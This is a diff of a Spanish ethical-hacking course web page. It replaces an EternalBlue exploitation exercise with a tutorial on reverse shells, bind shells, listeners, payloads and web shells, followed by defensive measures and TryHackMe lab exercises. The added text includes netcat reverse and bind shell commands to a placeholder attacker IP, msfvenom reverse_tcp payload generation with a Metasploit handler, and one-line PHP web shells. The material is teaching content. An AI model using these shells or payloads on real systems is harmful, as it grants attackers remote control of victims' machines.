@@ -6,24 +6,24 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="Explotación manual y automática de EternalBlue, Windows. Apuntes, teoría, prácticas, ejercicio del curso de especialización de ciberseguridad. IES severo ochoa Elche. Hacking ético. incidentes de seguridad, puesta en producción segura.">
+        <meta name="description" content="Explicación teórica reverse shell, bind shell, paylods, webshells. Apuntes, teoría, prácticas, ejercicio del curso de especialización de ciberseguridad. IES severo ochoa Elche. Hacking ético. incidentes de seguridad, puesta en producción segura.">
       
       
       
-        <link rel="canonical" href="https://raul-profesor.github.io/Curso-especialista-ciberseguridad/segof/EternalBlue/">
+        <link rel="canonical" href="https://raul-profesor.github.io/Curso-especialista-ciberseguridad/segof/rev_shell/">
       
       
-        <link rel="prev" href="../metasploit/">
+        <link rel="prev" href="../EternalBlue/">
       
       
-        <link rel="next" href="../rev_shell/">
+        <link rel="next" href="../phising/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.1.8">
     
     
       
-        <title>Explotación de vulnerabilidad EternalBlue (MS17-010) - Seguridad en sistemas del curso de especialista en ciberseguridad</title>
+        <title>Una revisión de las shells - Seguridad en sistemas del curso de especialista en ciberseguridad</title>
       
     
     
@@ -89,7 +89,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#explotacion-de-eternalblue-sin-metasploit" class="md-skip">
+        <a href="#que-es-una-shell" class="md-skip">
           Saltar a contenido
         </a>
       
@@ -122,7 +122,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Explotación de vulnerabilidad EternalBlue (MS17-010)
+              Una revisión de las shells
             
           </span>
         </div>
@@ -595,6 +595,20 @@
               
   
   
+  
+    <li class="md-nav__item">
+      <a href="../EternalBlue/" class="md-nav__link">
+        Ejercicio práctico - Explotación de EternalBlue
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
     
   
   
@@ -605,12 +619,12 @@
       
       
         <label class="md-nav__link md-nav__link--active" for="__toc">
-          Ejercicio práctico - Explotación de EternalBlue
+          Shells
           <span class="md-nav__icon md-icon"></span>
         </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
-        Ejercicio práctico - Explotación de EternalBlue
+        Shells
       </a>
       
         
@@ -627,15 +641,143 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#explotacion-de-eternalblue-sin-metasploit" class="md-nav__link">
-    Explotación de EternalBlue sin Metasploit
+  <a href="#que-es-una-shell" class="md-nav__link">
+    ¿Qué es una shell?
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#explotacion-de-eternalblue-con-metasploit" class="md-nav__link">
-    Explotación de EternalBlue con Metasploit
+  <a href="#tipos-de-shell" class="md-nav__link">
+    Tipos de shell
+  </a>
+  
+    <nav class="md-nav" aria-label="Tipos de shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reverse-shell" class="md-nav__link">
+    Reverse shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bind-shell" class="md-nav__link">
+    Bind shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#listeners" class="md-nav__link">
+    Listeners
+  </a>
+  
+    <nav class="md-nav" aria-label="Listeners">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#herramientas-comunes" class="md-nav__link">
+    Herramientas comunes
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payloads" class="md-nav__link">
+    Payloads
+  </a>
+  
+    <nav class="md-nav" aria-label="Payloads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tipos-de-payloads" class="md-nav__link">
+    Tipos de payloads
+  </a>
+  
+    <nav class="md-nav" aria-label="Tipos de payloads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#usando-metasploit-para-payloads" class="md-nav__link">
+    Usando Metasploit para Payloads
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-shells" class="md-nav__link">
+    Web Shells
+  </a>
+  
+    <nav class="md-nav" aria-label="Web Shells">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#proposito-y-uso" class="md-nav__link">
+    Propósito y uso
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lenguajes-comunes-para-web-shells" class="md-nav__link">
+    Lenguajes comunes para Web Shells
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#deteccion-y-defensa" class="md-nav__link">
+    Detección y defensa
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#resumen-de-escenarios-de-ejemplo" class="md-nav__link">
+    Resumen de escenarios de ejemplo
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#medidas-defensivas" class="md-nav__link">
+    Medidas defensivas
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ejercicios-propuestos" class="md-nav__link">
+    Ejercicios propuestos
   </a>
   
 </li>
@@ -644,20 +786,6 @@
   
 </nav>
       
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../rev_shell/" class="md-nav__link">
-        Shells
-      </a>
     </li>
   
 
@@ -917,68 +1045,193 @@
                   
 
 
-  <h1>Ejercicio práctico - Explotación de EternalBlue</h1>
+  <h1>Shells</h1>
 
-<h2 id="explotacion-de-eternalblue-sin-metasploit">Explotación de EternalBlue sin Metasploit</h2>
-<p>Para este ejercicio vamos a hacer uso de una máquina de TryHackMe, especialmente diseñada para ser vulnerable a EternalBlue: <a href="https://tryhackme.com/room/blue">Sala de THM</a></p>
-<p>En este caso no vamos a completar la sala tal cual está escrita en THM, sino que el proceso lo realizaremos <em>manualmente</em>, sin utilizar la herramienta Metasploit. No obstante, nos aprovecharemos de esta máquina.</p>
-<p>Os detallo los apartados que debéis documentar a la hora de entregar el informe del proceso completo en Aules (explicación + capturas de pantalla)</p>
-<ol>
-<li>El primer paso será, como ya vimos en clases anteriores, realizar un escaneo de puertos con Nmap. Recordad los conceptos ya vistos.</li>
-</ol>
-<div class="admonition tip">
-<p class="admonition-title">Pista</p>
-<p>Una vez hayáis descubierto los puertos abiertos, haced un nuevo escaneo pero esta vez indicad directamente el puerto de SMB (¿cuál es?) utilizando el switch u opción de nmap adecuada.</p>
-<p>De la misma forma, puesto que vamos en busca y captura de EternalBlue, una vulnerabilidad, utilizad la opción de los scripts de Nmap e indicándole la categoría <em>vuln</em>.</p>
-</div>
-<ol>
-<li>
-<p>A la hora de explotar la vulnerabilidad, podéis clonaros <a href="https://github.com/3ndG4me/AutoBlue-MS17-010">este repositorio de Github</a>, que contiene los scripts y archivos que necesitaremos.
-   Leed atentamente las instrucciones que vienen explicadas en el repositorio, especialmente las del apartado <em>Usage</em></p>
+<h2 id="que-es-una-shell">¿Qué es una shell?</h2>
+<p>Una shell es un software que permite al usuario interactuar con un sistema operativo, normalmente es una interfaz de línea de comandos.</p>
+<p>En ciberseguridad, nos referimos comúnmente a una sesión shell específica que un atacante utiliza cuando accede a un sistema comprometido, permitiéndole ejecutar diferentes comandos. Esto permitirá llevar a cabo varias actividades, algunas de las cuales se describen a continuación.</p>
+<ul>
+<li><strong>Control remoto del sistema</strong>: permite al atacante ejecutar comandos o software de forma remota en el sistema objetivo.</li>
+<li><strong>Escalada de privilegios</strong>: Si el acceso inicial a través de una shell está limitado o restringido, los atacantes pueden explorar formas de escalar privilegios a accesos más elevados o administrativos.</li>
+<li><strong>Exfiltración de datos</strong>: Una vez que los atacantes tienen acceso para ejecutar comandos a través de un shell obtenido, pueden explorar el sistema para leer y copiar datos sensibles del mismo.</li>
+<li><strong>Persistencia y Acceso de Mantenimiento</strong>: Una vez obtenido el acceso al shell, los atacantes pueden crear accesos a través de usuarios y credenciales o copiar software de puerta trasera para mantener el acceso al sistema objetivo para su uso posterior.</li>
+<li><strong>Actividades posteriores a la explotación</strong>: Una vez concedido el acceso a un shell, los atacantes pueden realizar una amplia gama de actividades posteriores a la explotación, como desplegar malware, crear cuentas ocultas y eliminar información.</li>
+<li><strong>Acceder a otros sistemas de la red</strong>: Dependiendo de las intenciones del atacante, el shell obtenido puede ser sólo un punto de acceso inicial. El objetivo puede ser saltar a través de la red hacia un objetivo diferente utilizando la shell obtenida como pivote hacia diferentes puntos de la red del sistema comprometido. Esto también se conoce como pivoting o movimiento lateral.</li>
+</ul>
+<h2 id="tipos-de-shell">Tipos de shell</h2>
+<h3 id="reverse-shell">Reverse shell</h3>
 <ul>
 <li>
-<p>Utilizando el script eternal_checker.py, comprobad si la máquina objeto del ataque está parca.</p>
+<p><u>Definición:</u> Un reverse shell es un tipo de acceso remoto donde la <strong>máquina objetivo (víctima)</strong> inicia una conexión saliente a la <strong>máquina del atacante</strong>. Esta conexión permite al atacante acceder a la línea de comandos de la máquina objetivo.</p>
 </li>
 <li>
-<p>Seguid los pasos y compilad el shellcode adecuado.</p>
+<p><u>Cómo funciona:</u> En una configuración de shell inversa, el atacante configura un <strong>listener</strong> en un puerto específico. Una vez que la carga se ejecuta en la máquina de destino, se conecta de nuevo a la máquina del atacante, creando una <strong>interfaz de línea de comandos</strong> a través de la red.</p>
+</li>
+<li>
+<p><u><strong>Por qué usar Reverse Shells</strong>:</u> Los shells inversos se utilizan a menudo para eludir cortafuegos y configuraciones NAT (Network Address Translation), que normalmente bloquean las conexiones entrantes pero permiten las salientes. Al iniciar una conexión saliente desde el objetivo, los shells inversos aprovechan esta apertura en el cortafuegos.</p>
 </li>
 </ul>
-<div class="admonition info">
-<p class="admonition-title">Concepto</p>
-<p>Un shellcode es un código escrito normalmente en ensamblador y compilado para un desterminado procesador que se inyecta en la memoria de un proceso para ejecutar lo que se le indique. En nuestro caso, una shell inversa.</p>
-</div>
-<div class="admonition warning">
-<p class="admonition-title">Atención</p>
+<p><strong><u>Ejemplo</strong></u></p>
+<p>Netcat es una herramienta que soporta múltiples sistemas oprativos, permite lecturas y escrituras a través de la red. </p>
+<p>El atacante utiliza Netcat para escuchar en el puerto 4444:</p>
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+<p>A continuación, el objetivo o víctima ejecuta un <em>payload</em> para conectarse de nuevo a la máquina del atacante:
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span><span class="o">[</span>atacante_IP<span class="o">]</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
+</code></pre></div></p>
+<p>Esta configuración permite al atacante controlar el intérprete de comandos de la víctima a través de la red.</p>
+<hr />
+<h3 id="bind-shell">Bind shell</h3>
 <ul>
 <li>
-<p>Elegiremos la opción de generar la shell inversa (reverse shell) con <strong><em>msfvenom</em></strong>. Msfvenom es una instancia en línea de comandos que se usa para generar y codificar (para evitar detecciones de antimalware) payloads o shellcodes.</p>
+<p><u>Definición:</u> En una bind shell, la máquina objetivo escucha en un puerto específico, esperando una conexión entrante del atacante. Una vez que el atacante se conecta, obtiene acceso remoto a la línea de comandos.</p>
 </li>
 <li>
-<p>Compilaremos para la arquitectura de 32 bits (x86) y para la de 64 (x64), puesto que en principio no sabemos qué versión de sistema operativo estamos atacando.</p>
+<p><u>Cómo funciona:</u> Con una bind shell la <strong>máquina objetivo se convierte en el oyente</strong> y abre un puerto de red, vinculando un shell a ese puerto. El atacante se conecta a este puerto abierto para obtener acceso.</p>
 </li>
 <li>
-<p>Os preguntará a qué puerto debe conectarse la reverse shell para cada una de las dos arquitecturas. <strong>Poned puertos diferentes.</strong></p>
-</li>
-<li>
-<p>Le diremos que queremos generar una shell normal (cmd) y no una shell de meterpreter (terminal en Metasploit)</p>
-</li>
-<li>
-<p>Por último, le diremos que queremos generar un payload <em>stageless</em>.</p>
+<p><u>Limitaciones de Bind Shells:</u> Los Bind Shells son más difíciles de usar en entornos con cortafuegos restrictivos o NAT porque requieren que la máquina de destino acepte conexiones entrantes en un puerto específico.</p>
 </li>
 </ul>
-</div>
+<p><strong><u>Ejemplo</strong></u></p>
+<p>La máquina destino utiliza Netcat para configurar un bind shell:</p>
+<p><div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
+</code></pre></div>
+A continuación, el atacante se conecta a la IP y al puerto de la máquina objetivo:
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span><span class="o">[</span>IP_objetivo<span class="o">]</span><span class="w"> </span><span class="m">4444</span>
+</code></pre></div></p>
+<hr />
+<p><strong>Reverse shells VS Bind shells</strong></p>
+<ul>
+<li>Las <strong>Reverse Shells</strong> se prefieren en entornos seguros porque inician conexiones salientes, a menudo permitidas por cortafuegos.</li>
+<li>Las <strong>Bind Shells</strong> requieren un puerto de entrada abierto, que a menudo es bloqueado por los cortafuegos, haciéndolos más difíciles de ejecutar en las redes modernas.</li>
+</ul>
+<h3 id="listeners"><strong>Listeners</strong></h3>
+<ul>
+<li>
+<p><u>Definición:</u> Un listener es un proceso configurado por el atacante para esperar una conexión entrante desde una máquina objetivo. El listener es crítico para establecer tanto reverse como bind shells.</p>
 </li>
 <li>
-<p>El shellcode generado tendrá el nombre <code>sc_all.bin</code> y se habrá generado dentro de la carpeta de los shellcodes.</p>
+<p><u>Propósito:</u> El listener actúa como receptor, esperando a que la máquina objetivo inicie una conexión (en reverse shells) o se conecte a un puerto abierto del objetivo (en bind shells).</p>
+</li>
+</ul>
+<h4 id="herramientas-comunes"><u><strong>Herramientas comunes</strong></u></h4>
+<ul>
+<li>
+<p><strong>Netcat (nc):</strong> Una de las herramientas más sencillas y utilizadas para configurar escuchas.</p>
 </li>
 <li>
-<p>Finalmente utilizaremos el script en python que nos permitirá explotar la vulnerabilidad. Los scripts están nombrados como <code>e..._exploitX.py</code>, donde la X es el número de versión del sistema operativo. Del escaneo de Nmap o de la salida del script de chequeo del estado de parcheo, habréis obtenido la versión adecuada.</p>
+<p><strong>Metasploit Multi/Handler</strong>: La herramienta <code>multi/handler</code> de Metasploit está diseñada para gestionar listeners para varios tipos de payloads, incluyendo reverse shells, proporcionando flexibilidad y características más allá de lo que ofrece Netcat.</p>
+</li>
+</ul>
+<p><strong>Ejemplo de listener de Netcat</strong>:
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">4444</span><span class="w"> </span><span class="c1"># escucha en el puerto 4444 cualquier conexión entrante</span>
+</code></pre></div></p>
+<hr />
+<h3 id="payloads"><strong>Payloads</strong></h3>
+<ul>
+<li><u>Definición:</u> Un payload es una pieza de código que se ejecuta en la máquina objetivo para establecer una conexión de vuelta al atacante o abrir un puerto para que el atacante se conecte. La carga útil puede iniciar un shell inverso o bind y puede variar en función del sistema operativo de destino, el tipo de shell o las necesidades de evasión.</li>
+</ul>
+<h4 id="tipos-de-payloads">Tipos de payloads</h4>
+<ul>
+<li><strong>Payload de shell inversa:</strong> Diseñado para iniciar una conexión saliente desde la máquina objetivo de vuelta al atacante.</li>
+<li><strong>Payload para bind shell:</strong> Configurar un oyente en el objetivo para que el atacante se conecte.</li>
+<li><strong>Payloads en scripts:</strong> Los payloads personalizadas también pueden escribirse en lenguajes de scripting como Bash, Python, PowerShell o incluso JavaScript, dependiendo del objetivo y del contexto del ataque.</li>
+</ul>
+<h5 id="usando-metasploit-para-payloads">Usando Metasploit para Payloads</h5>
+<p>Metasploit provee payloads pre-construidos que pueden ser usados para generar reverse o bind shells.</p>
+<p>Ejemplo de comando: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=[attacker_IP] LPORT=4444 -f exe -o shell.exe</code>.</p>
+<hr />
+<h3 id="web-shells"><strong>Web Shells</strong></h3>
+<ul>
+<li><u>Definición:</u> Un web shell es un tipo de shell que se aloja en un servidor web, permitiendo a los atacantes interactuar con el servidor a través de una interfaz web. Normalmente se trata de un pequeño script subido al servidor para ejecutar comandos del sistema.</li>
+</ul>
+<h4 id="proposito-y-uso">Propósito y uso</h4>
+<ul>
+<li>Los atacantes utilizan web shells para obtener acceso persistente a un servidor web comprometido.</li>
+<li>Las web shells permiten a los atacantes ejecutar comandos, subir archivos y ejecutar scripts adicionales en el servidor.</li>
+</ul>
+<h4 id="lenguajes-comunes-para-web-shells">Lenguajes comunes para Web Shells</h4>
+<ul>
+<li><strong>PHP</strong>:  Esta simple shell PHP toma un parámetro <code>cmd</code> y lo ejecuta en el servidor: <code>&lt;?php system($_GET['cmd']); ?&gt;</code> -</li>
+<li><strong>ASP/ASPX</strong> (utilizado en servidores Windows).</li>
+<li><strong>JSP</strong> (Java Server Pages) para servidores basados en Java.</li>
+</ul>
+<h4 id="deteccion-y-defensa">Detección y defensa</h4>
+<ul>
+<li><strong>Vigilancia de la integridad de los archivos</strong>: Comprobación de cambios no autorizados en directorios web.</li>
+<li><strong>WAF (Web Application Firewalls)</strong>: Los WAF suelen detectar y bloquear los web shells.</li>
+<li><strong>Análisis de contenido</strong>: Escaneo de archivos en el servidor en busca de patrones comunes de web shell o código sospechoso.</li>
+</ul>
+<hr />
+<h3 id="resumen-de-escenarios-de-ejemplo">Resumen de escenarios de ejemplo</h3>
+<ol>
+<li>
+<p><strong>Shell inversa con Netcat</strong>:</p>
+<ul>
+<li>
+<p><strong>Atacante (Listener)</strong>:
+   <div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+   La opción <strong>-l</strong> le indica a netcat que espere una conexión, <strong>-v</strong> activa la salida detallada del comando, <strong>-n</strong> impide que las conexiones hagan uso de una búsqueda DNS (no se resolverá ningún nombre, se utilizarán IPs). Finalmente la opción <strong>-p</strong> indica el puerto en el que se escuchará en espera de conexciones entrantes.</p>
+</li>
+<li>
+<p><strong>Víctima (Payload)</strong>:
+   <div class="highlight"><pre><span></span><code>nc<span class="w"> </span><span class="o">[</span>atacante_IP<span class="o">]</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
+</code></pre></div></p>
+<p>Se podría utilizar cualquier puerto <em>libre</em> para escuchar.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Metasploit Reverse TCP Payload</strong>:</p>
+<ul>
+<li>Generar un payload:
+  <div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=[</span>attacker_IP<span class="o">]</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>reverse_shell.exe
+</code></pre></div></li>
+<li><strong>Escucha en Metasploit</strong>:
+  <div class="highlight"><pre><span></span><code>msfconsole
+use<span class="w"> </span>exploit/multi/handler
+<span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>windows/meterpreter/reverse_tcp
+<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="o">[</span>atacante_IP<span class="o">]</span>
+<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+exploit
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p><strong>Shell Web PHP</strong>:</p>
+<ul>
+<li>Crea una shell web PHP básica y súbela a un servidor web vulnerable.
+  <div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div></li>
+<li>Accede a la web shell navegando a <code>http://victima.com/shell.php?cmd=whoami</code>.</li>
+</ul>
 </li>
 </ol>
-<h2 id="explotacion-de-eternalblue-con-metasploit">Explotación de EternalBlue con Metasploit</h2>
-<p>En este caso, vamos a explotar EternalBlue haciendo uso de Metasploit.</p>
-<p>Debéis seguir el proceso que ya se ha comentado en la sección correspondiente; iniciar <code>msfconsole</code>, buscar un exploit para EternalBlue, configurar las opciones correspondientes y lanzar el exploit.</p>
-<p>Este proceso debe quedar reflejado con detalle, incluyendo capturas de pantalla, en un informe que se entregará en Aules.</p>
+<hr />
+<h3 id="medidas-defensivas">Medidas defensivas</h3>
+<ol>
+<li><strong>Reglas de cortafuegos</strong>: Restringir el tráfico saliente a puertos específicos para evitar que las reverse shells establezcan conexiones.</li>
+<li><strong>Sistemas de detección de intrusos</strong>: Utiliza herramientas como Suricata o Snort para detectar firmas comunes de shell y comportamientos inusuales en la red.</li>
+<li><strong>Seguridad de puntos finales</strong>: Despliegue soluciones EDR que supervisen procesos y conexiones de red anómalos.</li>
+<li><strong>Seguridad de aplicaciones web</strong>: Analice regularmente las aplicaciones web en busca de vulnerabilidades que podrían permitir a los atacantes cargar web shells.</li>
+</ol>
+<h2 id="ejercicios-propuestos">Ejercicios propuestos</h2>
+<ol>
+<li>
+<p>Realizar la máquina <a href="https://tryhackme.com/r/room/vulnversity"><strong>Vulnversity</strong> en TryHackMe</a>. Se trata de una máquina guiada donde repasamos fases que ya hemos visto: escaneo, enumeración y explotación mediante vulnerabilidad. Finalmente veremos una forma de obtener una shell inversa utilizando PHP. <strong>NO HACER LA PARTE DE ESCALADA DE PRIVILEGIOS</strong>.</p>
+</li>
+<li>
+<p>Realizar la máquina <a href="https://tryhackme.com/r/room/bsidesgtthompson"><strong>Thomson</strong> en TryHackMe</a>. Se trata de una máquina no guiada donde tras la fase de escaneo y enumeración debéis conseguir acceso a un famoso servidor de aplicaciones y tras ello crear con <em>msfvenom</em> una shell inversa en formato <em>.war</em>, que se desplegará en dicho servidor.
+    Al acceder al <em>.war</em> desplegado, se establecerá nuestra conexión inversa. Esta página os puede resultar de inmensa ayuda: <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom">https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom</a></p>
+</li>
+<li>
+<p>Realizar las fases que os marco en la imagen de abajo de la máquina <a href="https://tryhackme.com/r/room/rrootme"><strong>RootMe</strong> en TryHackMe</a>. </p>
+<p><img alt="" src="../../img/rootme.png" /></p>
+<p>En este caso debéis escanear con nmap, descubrir (mediante <em>gobuster</em> o <em>ffuf</em>) un directorio donde podáis subir archivos y, una vez en él, subir una reverse shell en formato <strong><em>.phtml</em></strong>. Podéis bajar cualquier shell prefabricada en PHP o generarla vosotros con ayuda de <a href="https://www.revshells.com/">esto</a> o de <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux#php">esto</a>.</p>
+</li>
+</ol>
 
 
   
@@ -1009,7 +1262,7 @@
       <nav class="md-footer__inner md-grid" aria-label="Pie" >
         
           
-          <a href="../metasploit/" class="md-footer__link md-footer__link--prev" aria-label="Anterior: Metasploit" rel="prev">
+          <a href="../EternalBlue/" class="md-footer__link md-footer__link--prev" aria-label="Anterior: Ejercicio práctico - Explotación de EternalBlue" rel="prev">
             <div class="md-footer__button md-icon">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
             </div>
@@ -1018,20 +1271,20 @@
                 Anterior
               </span>
               <div class="md-ellipsis">
-                Metasploit
+                Ejercicio práctico - Explotación de EternalBlue
               </div>
             </div>
           </a>
         
         
           
-          <a href="../rev_shell/" class="md-footer__link md-footer__link--next" aria-label="Siguiente: Shells" rel="next">
+          <a href="../phising/" class="md-footer__link md-footer__link--next" aria-label="Siguiente: Spoofing &amp; phising" rel="next">
             <div class="md-footer__title">
               <span class="md-footer__direction">
                 Siguiente
               </span>
               <div class="md-ellipsis">
-                Shells
+                Spoofing & phising
               </div>
             </div>
             <div class="md-footer__button md-icon">
